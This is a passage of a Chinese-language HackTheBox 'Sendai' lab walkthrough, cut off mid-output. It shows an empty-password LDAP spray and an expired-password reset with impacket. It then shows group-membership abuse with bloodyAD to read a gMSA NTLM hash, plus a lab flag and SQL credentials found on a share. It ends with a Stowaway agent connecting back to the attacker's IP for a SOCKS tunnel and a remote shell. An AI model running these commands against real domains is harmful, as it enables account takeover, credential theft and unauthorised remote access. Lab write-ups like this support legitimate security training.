+</span></span></code></pre></div><p>我之前经历过获得的用户是初始密码过期的目标用户，但是当时我已经获得了此用户的原始密码，所以我有权限直接通过远程修改密码，但是这次不太一样，我只能初步判断，目标用户的账户和密码应该是一样的，为了验证这一块，我需要rid爆破获取近乎所有用户，之后直接空密码爆破可以</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap $ip -u users -p <span style="color:#e6db74">&#34;&#34;</span> --continue-on-success
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:sendai.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\A</span>dministrator: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error in searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090D10, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\G</span>uest: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\k</span>rbtgt: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\D</span>C$: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\s</span>qlsvc: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\w</span>ebsvc: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\D</span>orothy.Jones: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\K</span>erry.Robinson: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\N</span>aomi.Gardner: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\A</span>nthony.Smith: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\S</span>usan.Harper: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\S</span>tephen.Simpson: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\M</span>arie.Gallagher: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\K</span>athleen.Kelly: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\N</span>orman.Baxter: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\J</span>ason.Brady: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\E</span>lliot.Yates: STATUS_PASSWORD_MUST_CHANGE
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\M</span>alcolm.Smith: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\L</span>isa.Williams: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\R</span>oss.Sullivan: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\C</span>lifford.Davey: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\D</span>eclan.Jenkins: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\L</span>awrence.Grant: 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\L</span>eslie.Johnson: 
+</span></span></code></pre></div><p>可以看到Elliot.Yates是一个过期用户，我尝试使用nxc直接修改密码，但是失败了，所以我开始枚举<a class="link" href="https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/"  target="_blank" rel="noopener"
+    >这篇文章</a>他引导我到了impacket的一个pull工单，让我意识到changepass.py使用ms-rpc更改是个能绕过的办法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-changepasswd sendai.vl/Elliot.Yates:<span style="color:#e6db74">&#34;&#34;</span>@$ip -newpass wackMaker1!
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Current password: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Changing the password of sendai.vl<span style="color:#ae81ff">\E</span>lliot.Yates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to DCE/RPC as sendai.vl<span style="color:#ae81ff">\E</span>lliot.Yates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Password is expired or must be changed, trying to bind with a null session.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to DCE/RPC as null session
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Password was changed successfully.
+</span></span></code></pre></div><p>当我查看参数直接键入密码的时候，成功更改完毕，我们的连接也正常</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u Elliot.Yates -p wackMaker1!
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sendai.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\E</span>lliot.Yates:wackMaker1! 
+</span></span></code></pre></div><p>可惜没有winrm权限，但是我们有足够的凭据抓取猎犬了</p>
+<p>因为我懒得贴图片，所以直接口语描述路径了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ELLIOT.YATES@SENDAI.VL属于support组，而这个组对admsvc组有通用all权限，admsvc组对MGTSVC$@SENDAI.VL这个用户有读gmsa的权限
+</span></span></code></pre></div><p>很简单的流程，将自己加入组，直接读gmsa</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $FQDN --dc-ip $ip -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> add groupMember ADMSVC <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elliot.Yates added to ADMSVC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $FQDN --dc-ip $ip -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> get object MGTSVC$ --attr msDS-ManagedPassword
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>mgtsvc,CN<span style="color:#f92672">=</span>Managed Service Accounts,DC<span style="color:#f92672">=</span>sendai,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:9ed35c68b88f35007aa32c14c1332ce7
+</span></span><span style="display:flex;"><span>msDS-ManagedPassword.B64ENCODED: MnRup9Cfg1yniZGnzaZM2tR8RVDOaG5abV/Z3wdvLW1+fLxXtQfra+OH3WUW0BmC9J1CUi2MKYeyfuiAcS16Q9d2BflORFv8jtQc2yE3Jo5OfPDcbOeYVLn9CWNZ+inVMQrf85QHomxbSAw5U440KhKnsGlZdTZ3CJ6hUoG2eFfPT57bn5C8/xXRx8tcwgHHUuQjChrve9rIzEPDFVD41vguikVetUgArPMvHjoLjg5Z1jrYqhMYUoS22Y3OcJhABJD4HCGNoqxegpm+1a6O5fDBbN6Zhfz62b9itG9QcwLyjrglBsdZZmEAqcFs9/Jfk3ZzeWzUWUWpwwyFUQsxug<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>很简单对吧，接下来看看这个用户，猎犬的信息到此中断，但是我们拥有了winrm权限</p>
+<h2 id="提权">提权
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         7/18/2023   6:09 AM                Administrator
+</span></span><span style="display:flex;"><span>d-----         9/18/2025   5:21 AM                mgtsvc$
+</span></span><span style="display:flex;"><span>d-r---         7/11/2023  12:36 AM                Public
+</span></span><span style="display:flex;"><span>d-----         8/18/2025   5:05 AM                sqlsvc
+</span></span></code></pre></div><p>在本地发现了数据库用户的桌面信息，可能是下一步，但是外部没开数据库，先留意一下</p>
+<p>看看dpapi发现没有什么信息,页面更目录下面找到user.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         7/11/2023   5:56 AM                config
+</span></span><span style="display:flex;"><span>d-----         4/15/2025   8:20 PM                inetpub
+</span></span><span style="display:flex;"><span>d-----          5/8/2021   1:20 AM                PerfLogs
+</span></span><span style="display:flex;"><span>d-r---         4/15/2025   7:51 PM                Program Files
+</span></span><span style="display:flex;"><span>d-----         7/18/2023   6:11 AM                Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>d-----         7/18/2023  10:31 AM                sendai
+</span></span><span style="display:flex;"><span>d-----         7/11/2023   2:35 AM                SQL2019
+</span></span><span style="display:flex;"><span>d-r---         9/18/2025   5:21 AM                Users
+</span></span><span style="display:flex;"><span>d-----         8/18/2025   5:04 AM                Windows
+</span></span><span style="display:flex;"><span>-a----         4/15/2025   8:27 PM             <span style="color:#ae81ff">32</span> user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> cat user.txt
+</span></span><span style="display:flex;"><span>fff335936142d21a6fa44123b897cd3e
+</span></span></code></pre></div><p>看看smb有无额外信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>└─$ nxc smb $ip -u $user1 -H $hash1 --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sendai.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\M</span>GTSVC$:9ed35c68b88f35007aa32c14c1332ce7 
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               config          READ,WRITE      
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               NETLOGON        READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               sendai          READ,WRITE      company share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               SYSVOL          READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               Users           READ            
+</span></span></code></pre></div><p>多出来了一个config日志可写可读，打开看一看发现是数据库密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -U $user1 --pw-nt-hash //$ip/config $hash1
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Sep <span style="color:#ae81ff">18</span> 08:43:26 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  ..                                DHS        <span style="color:#ae81ff">0</span>  Tue Apr <span style="color:#ae81ff">15</span> 22:55:42 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  .sqlconfig                          A       <span style="color:#ae81ff">78</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:57:11 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">7019007</span> blocks of size 4096. <span style="color:#ae81ff">1187661</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get .sql*
+</span></span><span style="display:flex;"><span>NT_STATUS_OBJECT_NAME_INVALID opening remote file <span style="color:#ae81ff">\.</span>sql*
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get .sqlconfig
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\.</span>sqlconfig of size <span style="color:#ae81ff">78</span> as .sqlconfig <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat .sqlconfig 
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">=</span>dc.sendai.vl,1433;Database<span style="color:#f92672">=</span>prod;User Id<span style="color:#f92672">=</span>sqlsvc;Password<span style="color:#f92672">=</span>SurenessBlob85;
+</span></span></code></pre></div><p>没有对外开，所以传stowawy上去做个sock隧道</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>gtsvc$<span style="color:#ae81ff">\D</span>ocuments&gt; ./windows_x64_agent.exe -c 10.10.16.23:443 -s <span style="color:#ae81ff">123456</span>
+</span></span><span style="display:flex;"><span>windows_x64_agent.exe : 2025/09/18 05:53:41 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting agent node actively.Connecting to 10.10.16.23:443
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : NotSpecified: <span style="color:#f92672">(</span>2025/09/18 05:5...10.10.16.23:443:String<span style="color:#f92672">)</span> <span style="color:#f92672">[]</span>, RemoteException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : NativeCommandError
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/ad-tools/proxy/stowaway<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./linux_x64_admin -l 0.0.0.0:443 -s <span style="color:#ae81ff">123456</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting admin node on port 0.0.0.0:443
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    .-<span style="color:#e6db74">&#39;)    .-&#39;</span><span style="color:#f92672">)</span> _                  <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\ .-&#39;</span><span style="color:#f92672">)</span> /<span style="color:#e6db74">&#39;  (&#39;</span>-.      <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\ .-&#39;</span><span style="color:#f92672">)</span> /<span style="color:#e6db74">&#39;  (&#39;</span>-.                 
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">(</span> OO <span style="color:#f92672">)</span>. <span style="color:#f92672">(</span>  OO<span style="color:#f92672">)</span> <span style="color:#f92672">)</span>                  <span style="color:#e6db74">&#39;.( OO ),&#39;</span> <span style="color:#f92672">(</span> OO <span style="color:#f92672">)</span>.-.   <span style="color:#e6db74">&#39;.( OO ),&#39;</span> <span style="color:#f92672">(</span> OO <span style="color:#f92672">)</span>.-.             
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>---<span style="color:#ae81ff">\_</span><span style="color:#f92672">)</span>/     <span style="color:#e6db74">&#39;._  .-&#39;</span><span style="color:#f92672">)</span>,-----. ,--./  .--.   / . --. /,--./  .--.   / . --. /  ,--.   ,--.
+</span></span><span style="display:flex;"><span>   /    _ | |<span style="color:#e6db74">&#39;--...__)( OO&#39;</span>  .-.  <span style="color:#e6db74">&#39;|      |  |   | \-.  \ |      |  |   | \-.  \    \  &#39;</span>.<span style="color:#e6db74">&#39;  / 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \  :&#39;</span> <span style="color:#e6db74">&#39;. &#39;</span>--.  .--<span style="color:#e6db74">&#39;/   |  | |  ||  |   |  |,.-&#39;</span>-<span style="color:#e6db74">&#39;  |  ||  |   |  |,.-&#39;</span>-<span style="color:#e6db74">&#39;  |  | .-&#39;</span><span style="color:#f92672">)</span>     /  
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;..&#39;&#39;&#39;</span>.<span style="color:#f92672">)</span>   |  |   <span style="color:#ae81ff">\_</span><span style="color:#f92672">)</span> |  |<span style="color:#ae81ff">\|</span>  <span style="color:#f92672">||</span>  |.<span style="color:#e6db74">&#39;.|  |_)\| |_.&#39;</span>  <span style="color:#f92672">||</span>  |.<span style="color:#e6db74">&#39;.|  |_)\| |_.&#39;</span>  |<span style="color:#f92672">(</span>OO  <span style="color:#ae81ff">\ </span>  /   
+</span></span><span style="display:flex;"><span>   .-._<span style="color:#f92672">)</span>   <span style="color:#ae81ff">\ </span>  |  |     <span style="color:#ae81ff">\ </span>|  | |  <span style="color:#f92672">||</span>         |   |  .-.  <span style="color:#f92672">||</span>         |   |  .-.  | |   /  /<span style="color:#ae81ff">\_</span>  
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">\ </span>      /   |  |      <span style="color:#e6db74">&#39;&#39;</span>  <span style="color:#e6db74">&#39;-&#39;</span>  <span style="color:#e6db74">&#39;|   ,&#39;</span>.   |   |  | |  <span style="color:#f92672">||</span>   ,<span style="color:#e6db74">&#39;.   |   |  | |  | &#39;</span>-./  /.__<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;-----&#39;</span>    <span style="color:#e6db74">&#39;--&#39;</span>        <span style="color:#e6db74">&#39;-----&#39;</span> <span style="color:#e6db74">&#39;--&#39;</span>   <span style="color:#e6db74">&#39;--&#39;</span>   <span style="color:#e6db74">&#39;--&#39;</span> <span style="color:#e6db74">&#39;--&#39;&#39;--&#39;</span>   <span style="color:#e6db74">&#39;--&#39;</span>   <span style="color:#e6db74">&#39;--&#39;</span> <span style="color:#e6db74">&#39;--&#39;</span>   <span style="color:#e6db74">&#39;--&#39;</span>      
+</span></span><span style="display:flex;"><span>			            <span style="color:#f92672">{</span> v2.2  Author:ph4ntom <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Waiting <span style="color:#66d9ef">for</span> new connection...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connection from node 10.129.234.66:57556 is set up successfully! Node id is <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span> &gt;&gt; use <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>node 0<span style="color:#f92672">)</span> &gt;&gt; socks <span style="color:#ae81ff">5555</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to listen on 0.0.0.0:5555......
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Waiting <span style="color:#66d9ef">for</span> agent<span style="color:#e6db74">&#39;s response......
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Error: listen tcp: address tcp/5555: unknown port
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(node 0) &gt;&gt; shell
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Waiting for response.....
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Microsoft Windows [Version 10.0.20348.4052]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(c) Microsoft Corporation. All rights reserved.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">C:\Users\mgtsvc$\Documents&gt;whoami
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">whoami
